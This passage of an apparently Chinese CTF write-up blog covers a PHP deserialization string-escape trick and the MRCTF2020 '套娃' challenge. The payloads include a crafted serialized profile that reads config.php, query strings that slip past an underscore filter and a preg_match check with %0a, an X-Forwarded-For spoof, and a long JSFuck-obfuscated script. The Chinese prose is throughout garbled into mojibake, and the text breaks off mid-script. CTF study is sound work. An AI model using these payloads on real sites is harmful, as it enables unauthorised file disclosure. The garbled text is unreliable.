ä¸ºæ£€æµ‹åˆ°<code>where</code>ï¼Œå°†å…¶æ›¿æ¢æˆ<code>hacker</code>ï¼Œå˜æˆï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">$profile = a<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;phone&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">11</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;12345678901&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;email&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ss@q.com&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;nickname&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">204</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;photo&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;config.php&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;;&#125;  s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:39:&quot;</span>upload/<span class="hljs-number">804</span>f743824c0451b2f60d81b63b6a900<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æƒ³è¯´è¯´å…·ä½“æ€ä¹ˆæ¥çš„ï¼š<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>ã€‚å› ä¸ºæ•°ç»„çš„å½¢å¼æˆ‘ä»¬éœ€è¦<code>&quot;;&#125;</code>é—­åˆ<code>nickname</code>çš„å°¾å·´ã€‚ååºåˆ—åŒ–â€åâ€å‡ºåä¼šåœ¨<code>s:10:&quot;config.php&quot;;&#125;</code>å†åŠ ä¸ª<code>&quot;;&#125;</code>å»é—­åˆæˆ‘ä»¬æ„é€ çš„æ•°ç»„ã€‚</p><p>å…¶å®è¿™ä¸ª<code>&quot;;&#125;</code>æœ‰æ²¡æœ‰éƒ½æ— æ‰€è°“çš„ï¼Œååºåˆ—åŒ–åˆ°ç¬¬ä¸€ä¸ª<code>&quot;;&#125;</code>å·²ç»ç»“æŸäº†ã€‚</p><p>ç„¶åæŠ“åŒ…ä¿®æ”¹ï¼š</p><p><img src="/img/pia3.png" alt="pia3"></p><p><img src="/img/pia4.png" alt="pia4"></p><p><img src="/img/pia5.png" alt="pia5"></p><h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æºç </span><br>&lt;!--<br><span class="hljs-comment">//1st</span><br><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]; <span class="hljs-comment">//è·å–å½“å‰é¡µé¢ URL ä¸­é—®å·åé¢çš„æŸ¥è¯¢å­—ç¬¦ä¸²éƒ¨åˆ†</span><br><br> <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>); <span class="hljs-comment">//ä¸å…è®¸å­˜åœ¨ä¸‹åˆ’çº¿æˆ–å…¶URLç¼–ç </span><br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to the next ~&quot;</span>; <span class="hljs-comment">//GETä¼ å‚b_u_p_t,ä¸è‹¥ç­‰äº23333ä¸”å¿…é¡»ä¸¥æ ¼åŒ¹é…23333æ‰è¿”å›trueï¼Œ^è¡¨ç¤ºå¼€å§‹%$è¡¨ç¤ºç»“æŸ</span><br>&#125;<br>!--&gt;<br></code></pre></td></tr></table></figure><p>æ¡ä»¶ä¸€å’Œæ¡ä»¶äºŒæ˜¯çŸ›ç›¾çš„ï¼Œä¸è¿‡ç”±äº<code>PHP</code>è¿™ç§ä¼Ÿå¤§çš„è¯­è¨€å­˜åœ¨è‚¯å®šå˜å¾—ä¸çŸ›ç›¾äº†ã€‚ç½‘ä¸Šæœäº†ä¸‹<code>substr_count</code>ç»•è¿‡ç»“æœç›´æ¥æŠŠ<code>wp</code>æœå‡ºæ¥äº†ã€‚ã€‚åé¢æƒ³äº†æƒ³è¿™ä¸ªä¸‹åˆ’çº¿çš„é—®é¢˜ï¼Œä¹‹å‰<code>newstarctf</code>åšè¿‡ä¸€é“ç±»ä¼¼çš„ï¼Œå¯ä»¥é€šè¿‡ä¸€äº›éæ³•å­—ç¬¦å»æ›¿æ¢è¿™ä¸ªä¸‹åˆ’çº¿<code>(https://www.freebuf.com/articles/web/213359.html)</code></p><p>ç»•è¿‡è¿™ä¸ª<code>_</code>ä¸»è¦æœ‰ä¸‰ç§æ–¹æ³•ï¼š</p><p>1.åˆ©ç”¨ç©ºæ ¼ã€‚</p><p>2.åˆ©ç”¨å°æ•°ç‚¹ã€‚</p><p>3.åˆ©ç”¨<code>[</code>ï¼ˆæ³¨æ„è¿™ä¸ªåªèƒ½åˆ©ç”¨ä¸€æ¬¡ï¼Œå½“PHPç‰ˆæœ¬å°äº8æ—¶ï¼Œä¸­æ‹¬å·ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼Œä½†æ˜¯ä¼šå‡ºç°è½¬æ¢é”™è¯¯å¯¼è‡´æ¥ä¸‹æ¥å¦‚æœè¯¥å‚æ•°åä¸­è¿˜æœ‰<code>éæ³•å­—ç¬¦</code>å¹¶ä¸ä¼šç»§ç»­è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼‰</p><p><code>/?b u p t </code>æˆ–<code>/?b.u.p.t</code></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ­£åˆ™åŒ¹é…çš„ç»•è¿‡ï¼Œ<code>0xGame</code>åšè¿‡ç±»ä¼¼çš„ï¼Œ<code>preg_match</code>è¿™ä¸œè¥¿åªä¼šåŒ¹é…ç¬¬ä¸€è¡Œï¼Œæ‰€ä»¥å¯ä»¥ç”¨<code>%0a</code>ç»•è¿‡ã€‚(<code>å‚è€ƒï¼šhttps://www.cnblogs.com/iwantflag/p/15262445.html</code>)</p><p>ç»¼ä¸Šæˆ‘ä»¬å¯ä»¥ä»¤<code>/?b u p t=23333%0a</code>ï¼š</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">how smart you <span class="hljs-keyword">are</span> ~<br><br>FLAG <span class="hljs-keyword">is</span> in secrettw.php<br></code></pre></td></tr></table></figure><p>è®¿é—®<code>secrettw.php</code>:</p><p><img src="/img/taowa1.png" alt="taowa1"></p><p>æç¤ºåªæœ‰æœ¬åœ°æ‰èƒ½è®¿é—®ï¼ŒæŠ“åŒ…åŠ ä¸ªå¤´<code>X-Forwarded-For:127.0.0.1</code>ï¼Œä¸è¿‡æ²¡æˆåŠŸï¼Ÿåé¢åˆå°è¯•<code>X-Real-IP/Client-IP</code>éƒ½æ²¡æˆåŠŸã€‚ã€‚å³é”®çœ‹æºç å‘ç°è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">&lt;!--<br><span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>((!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(+<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(+(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>))<span class="hljs-comment">[(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+((+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span 